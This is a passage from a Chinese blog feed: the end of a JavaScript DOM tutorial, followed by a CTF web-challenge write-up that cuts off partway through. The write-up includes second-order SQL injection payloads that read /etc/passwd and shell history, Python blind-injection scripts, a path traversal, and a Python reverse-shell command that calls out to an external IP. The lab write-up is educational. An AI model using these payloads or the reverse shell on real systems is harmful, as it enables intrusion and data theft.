如果有选择器对应的元素，获取到第一个    如果没用选择器对应的元素，返回null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411143324177.png" alt="image-20220411143324177"></p></li></ol><p><strong>操作元素内容</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144452327.png" alt="image-20220411144452327"></p><ol><li><p>操作元素文本内容</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144426234.png" alt="image-20220411144426234"></p></li><li><p>操作元素超文本内容</p></li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144816538.png" alt="image-20220411144816538"></p><p><strong>操作元素属性</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145038287.png" alt="image-20220411145038287"></p><ol><li><p>原生属性</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145906291.png" alt="image-20220411145906291"></p></li><li><p>自定义属性</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411150625140.png" alt="image-20220411150625140"></p></li></ol><p><strong>操作元素类名</strong></p><pre><code>获取: 元素.className设置； 元素.className = &#39;新类名&#39;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411151419501.png" alt="image-20220411151419501"></p><p><strong>操作元素行内样式</strong></p><pre><code>获取: 元素.style.样式名设置: 元素.style.样式名 = &#39;样式值&#39;注意: 只能获取和设置元素的行内样式</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152231051.png" alt="image-20220411152231051"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152308257.png" alt="image-20220411152308257"></p><p><strong>获取元素非行内样式</strong></p><pre><code>获取:window.getComputedStyle(元素).样式名注意； 可以获取行内样式，也可以获取非行内样式</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152807202.png" alt="image-20220411152807202"></p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf刷题-第一周题目</title>
      <link href="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/"/>
      <url>/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h1><p><strong>Web方向：</strong></p><p>[b01lers2020]Welcome to Earth</p><p>[网鼎杯 2018]Comment</p><p>[GYCTF2020]Ezsqli</p><p>[网鼎杯 2020 白虎组]PicDown</p><p>[watevrCTF-2019]Cookie Store</p><p>[SWPUCTF 2018]SimplePHP</p><p>[WUSTCTF2020]CV Maker</p><p>[HarekazeCTF2019]encode_and_encode</p><p>[红明谷CTF 2021]write_shell</p><p>[SUCTF 2019]EasyWeb</p><p>[RootersCTF2019]I_&lt;3_Flask</p><p>[NCTF2019]SQLi</p><p>[NPUCTF2020]ezinclude</p><p>[CISCN2019 华东南赛区]Double Secret</p><h1 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h1><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>进去后，它会直接提示我，我die了，但是我们可以注意到它有个一闪而过的画面。</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203228318.png" alt="image-20220328203228318"></p><p>在这个页面没有发现，使用burp抓包</p><p>抓到</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203639569.png" alt="image-20220328203639569"></p><p>查看源代码，发现了个有趣的路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204251360.png" alt="image-20220328204251360"></p><p>继续用burp抓包打开</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204549649.png" alt="image-20220328204549649"></p><p>这两个都点击后，没有效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204655545.png" alt="image-20220328204655545"></p><p>查看下源代码，发现一个可疑路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204718322.png" alt="image-20220328204718322"></p><p>进入后，界面如下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204815035.png" alt="image-20220328204815035"></p><p>点击按钮，又会die</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204844208.png" alt="image-20220328204844208"></p><p>继续查看源代码，无限套娃呗</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204931097.png" alt="image-20220328204931097"></p><p>进去</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205009037.png" alt="image-20220328205009037"></p><p>点击continue<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205120224.png" alt="image-20220328205120224"></p><p>要选择一个正确的数字，但是太多了吧，先看看源代码吧，发现如下js代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205425890.png" alt="image-20220328205425890"></p><p>嘿嘿，不用一个个试了，直接到open目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205558332.png" alt="image-20220328205558332"></p><p>继续查看源代码，发现fight目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205711090.png" alt="image-20220328205711090"></p><p>进入，一个可怕的外星人</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205745540.png" alt="image-20220328205745540"></p><p>继续查看源代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205854907.png" alt="image-20220328205854907"></p><p>发现flag的顺序被打算，想要反解函数不现实，尝试全排列</p><pre><code>itertools.permutations()：就是返回可迭代对象的所有数学全排列方式,它以任意迭代作为参数，并始终返回生成元组的迭代器。它没有(也不应该)特殊的字符串。要获得字符串列表，您可以自己加入元组： list(map(&quot;&quot;.join, itertools.permutations(&#39;1234&#39;)))</code></pre><pre><code class="python">from itertools import permutationsflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item:    #print (i)    k=&quot;&quot;.join(i)    #print(k)    if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1]==&#39;&#125;&#39;:        print(k)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328215044738.png" alt="image-20220328215044738"></p><p>找到可能的flag，尝试即可</p><p>最终flag为</p><pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>需要登录才能发帖</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231641292.png" alt="image-20220328231641292"></p><p>.给了账号和密码前几位，直接burp爆破</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231742892.png" alt="image-20220328231742892"></p><p>成功爆破出密码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231810749.png" alt="image-20220328231810749"></p><p>没发现什么有用的，用dirsearch扫一下目录，注意，由于buu很容易崩溃，要降低速度</p><pre><code>python dirsearch.py -u http://bc06d5bc-c6b1-49d6-b004-e2f130e630ae.node4.buuoj.cn:81/ -e php -t 2 -s 0.2 -o C:\User\Sakura\Desktop\2.txt</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232440677.png" alt="image-20220328232440677"></p><p>发现git泄露,使用githack扒出源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232710003.png" alt="image-20220328232710003"></p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    break;case &#39;comment&#39;:    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>但是这段代码明显不完整</p><p>使用(这里推荐使用linux，我用windows出现了错误)</p><pre><code>git log --all</code></pre><p>查一下之前提交的版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000637723.png" alt="image-20220329000637723"></p><p>恢复到初始版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000916068.png" alt="image-20220329000916068"></p><p>成功得到完整源码</p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>开始审计代码</p><p>先介绍下addslashes函数</p><pre><code>addslashes() 函数在指定的预定义字符前添加反斜杠。这些字符是单引号（&#39;）、双引号（&quot;）、反斜线（\）与NUL（NULL字符）。</code></pre><p>逻辑其实很清晰</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329003323533.png" alt="image-20220329003323533"></p><p>当我们访问一个页面，取出这个页面中category的值然后接受content的值，插入到该页面。但是问题就出在，此代码只对用户输入的值做了转义，而绝对信任从服务器中取出的值，这就导致了二次注入。所以我们要想办法闭合sql语句，使其可以执行我们恶意的sql语句。</p><p>所以我们要对发帖处的categories做特殊输入</p><pre><code>0&#39;,content = database(), /*</code></pre><p>然后在留言处输入</p><pre><code>*/#</code></pre><p>这时候的sql语句就变为</p><pre><code>$sql = &quot;insert into comment        set category = &#39;0&#39;,content = &#39;database()&#39;/*&#39;,        content = &#39;*/#&#39;,        bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>简化后</p><pre><code>$sql = &quot;insert into comment set category = &#39;0&#39;,content = &#39;database()&#39;,bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>这样通过在category构造，可以把content替换成我们想要的语句</p><p>我们来看一下执行效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005247027.png" alt="image-20220329005247027"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005310132.png" alt="image-20220329005310132"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005321316.png" alt="image-20220329005321316"></p><p>成功爆出了数据库</p><p>查看一下权限</p><pre><code>0&#39;,content = user(), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005602357.png" alt="image-20220329005602357"></p><p>最高权限，可以尝试load_file()读取文件</p><pre><code>0&#39;,content = load_file(&#39;/etc/passwd&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005942676.png" alt="image-20220329005942676"></p><p>我们发现www用户(一般和网站操作相关的用户，由中间件创建)在/home/www目录,读取这下面的.bash_history文件</p><pre><code>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</code></pre><pre><code>0&#39;,content = load_file(&#39;/home/www/.bash_history&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010244317.png" alt="image-20220329010244317"></p><p>我们可以看到它解压了一个html.zip，删除html.zip,然后整个文件夹复制到/var/www/html里，然后删除.DS_Store</p><pre><code>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。</code></pre><p>它还有一份存在于在/tmp//html/目录中，构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/tmp/html/.DS_Store&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010811271.png" alt="image-20220329010811271"></p><p>这里文件太多，无法完全显示，进行十六进制转换</p><pre><code>0&#39;,content = hex(load_file(&#39;/tmp/html/.DS_Store&#39;)), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329011204300.png" alt="image-20220329011204300"></p><p>解码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013046184.png" alt="image-20220329013046184"></p><p>发现可疑文件</p><pre><code>flag_8946e1ff1ee3e40f.php</code></pre><p>构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;), /*</code></pre><p>这里有个坑，/tmp/html/flag_8946e1ff1ee3e40f.php的flag是假flag，还是要当当前运行的网站目录下读取</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013441800.png" alt="image-20220329013441800"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013451988.png" alt="image-20220329013451988"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考察sql注入</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161851618.png" alt="image-20220329161851618"></p><p>测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161953080.png" alt="image-20220329161953080"></p><p>有waf，fuzz一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162032033.png" alt="image-20220329162032033"></p><p>发现很多关键词被过滤了</p><p>考虑盲注，测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162428599.png" alt="image-20220329162428599"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162354207.png" alt="image-20220329162354207"></p><p>确认了盲注的存在</p><pre><code>为什么加上||1=1后，值会变为Nu1L后呢，这里牵扯到运算顺序，这是我之前百思不得其解的一点，后门才想起来</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162630562.png" alt="image-20220329162630562"></p><p>我们可以看到比较运算的优先级是高于or的，所以会先判断右边的值是否为真，如果为真就不会再看左边了。</p><p>总之我们确定了要从盲注入手，但还有一个关键点，那就是information这个表被禁用，我们需要从其他表中获取我们需要的内容。</p><p><strong>1.利用mysql5.7新增的sys.schema_auto_increment_columns</strong></p><pre><code> 这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名以下为该视图的所有列</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141522482.png" alt="img"></p><p><strong>2.sys.schema_table_statistics_with_buffer</strong></p><pre><code> 这是sys数据库下的视图，里面存储着所有数据库所有表的统计信息  与它表结构相似的视图还有  sys.x$schema_table_statistics_with_buffer  sys.x$schema_table_statistics  sys.x$ps_schema_table_statistics_io以下为该视图的常用列（全部列有很多很多)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141702221.png" alt="img"></p><p><strong>3.mysql默认存储引擎innoDB携带的表</strong></p><pre><code>  mysql.innodb_table_stats  mysql.innodb_index_stats  两表均有database_name和table_name字段，可以利用</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141811114.png" alt="img"></p><p>盲注需要用二进制跑才能提高效率，贴上写的盲注脚本，我太菜了写一个要半天时间</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;i = 0result = &#39;&#39;for i in range(1,2000):    min = 32    max = 128    mid = (min + max) // 2    while min &lt; max:        payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i, mid)        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        if &quot;Error&quot; in res.text:            min = mid + 1        else:            max = mid        mid = (min + max) // 2    result += chr(int(mid))    print(result)    time.sleep(0.5)</code></pre><p>最好的办法是背下来模板，这样真正的比赛时才能较快写题。</p><p>最终得到两个表</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329180202611.png" alt="image-20220329180202611"></p><p>接下来就要从表中拿flag</p><p>下面要用到<strong>无列名注入</strong></p><p>为什么要采用这个注入呢，是因为sys.schema_table_statistics_with_buffer中只有表的信息，并没有列的信息，因此无法使用常规的方法。</p><p>关于无列名注入，首先我们来看一个例子</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211549667.png" alt="image-20220329211549667"></p><p>这代表字符串的大小于长短无关，而与首字母(如果首字母相同则继续向下比大小)的ascii有关</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211742422.png" alt="image-20220329211742422"></p><p>由这个我们就能构造出payload</p><p>先来判断下字段</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213941106.png" alt="image-20220329213941106"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213956411.png" alt="image-20220329213956411"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329214035443.png" alt="image-20220329214035443"></p><p>由此可判断字段为两个</p><p>payload</p><pre><code>id=1||((select 1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code></pre><p>代码:</p><p>暴力</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;value = &#39;&#39;def get_flag(char,value):    return value+charfor m in range(1,2000):    for i in range(32,128):        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;))&gt;(select * from f1ag_1s_h3r3_hhhhh)&#39;.format(get_flag(chr(i), value))        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        time.sleep(0.5)        if &quot;Nu1L&quot; in res.text:            value += chr(i-1)            print(value)            break</code></pre><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><strong>非预期解</strong></p><p>这题做的很奇妙，，，直接非预期解了</p><pre><code>e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/page?url=../../../../flag</code></pre><p>得到一个图片，拖到010editor，flag直接出现</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330004918193.png" alt="image-20220330004918193"></p><p><strong>预期解</strong></p><p>还是学习下正规思路吧</p><p>首先应该读取下进程信息</p><pre><code>在/proc 文件系统中，每一个进程都有一个相应的文件  。下面是/proc 目录下的一些重要文件  ：/proc/pid/cmdline  包含了用于开始进程的命令  ；/proc/pid/cwd 包含了当前进程工作目录的一个链接  ；/proc/pid/environ  包含了可用进程环境变量的列表  ；/proc/pid/exe  包含了正在进程中运行的程序链接；/proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；/proc/pid/mem  包含了进程在内存中的内容；/proc/pid/stat 包含了进程的状态信息；/proc/pid/statm  包含了进程的内存使用信息。 </code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010223445.png" alt="image-20220330010223445"></p><p>可以看到刚开始执行了</p><pre><code>python2 app.py</code></pre><p>我们来读取下app.py的源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010349857.png" alt="image-20220330010349857"></p><pre><code class="python">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;/&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;/page&#39;)def page():    url = request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=&#39;application/octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;            return response        else:            value = &quot;HACK ERROR!&quot;    except:        value = &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res=value)@app.route(&#39;/no_one_know_the_manager&#39;)def manager():    key = request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(&quot;shell&quot;)        os.system(shell)        res = &quot;ok&quot;    else:        res = &quot;Wrong Key!&quot;    return resif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre><p>linux里如果没有关闭文件会放在内存里，就算你remove掉了<strong>在/proc/[pid]/fd下还是会保存</strong></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012552404.png" alt="image-20220330012552404"></p><p>找到了密钥</p><pre><code>8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=</code></pre><p>结果是无回显rce</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012910567.png" alt="image-20220330012910567"></p><p>使用反弹shell</p><pre><code>http://e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/no_one_know_the_manager?key=8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=&amp;shell=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22108.166.201.16%22,3333));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330014147414.png" alt="image-20220330014147414"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>这题很简单，进去后我们只有50元但是有一个100元的曲奇</p><p>猜测购买这个曲奇获得flag</p><p>点击购买并抓包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164344642.png" alt="image-20220330164344642"></p><p>seesion很像base64加密</p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164431797.png" alt="image-20220330164431797"></p><p>修改下money然后再base64加密</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164507027.png" alt="image-20220330164507027"></p><p>购买100元的曲奇，替换原有的cookie</p><p><img 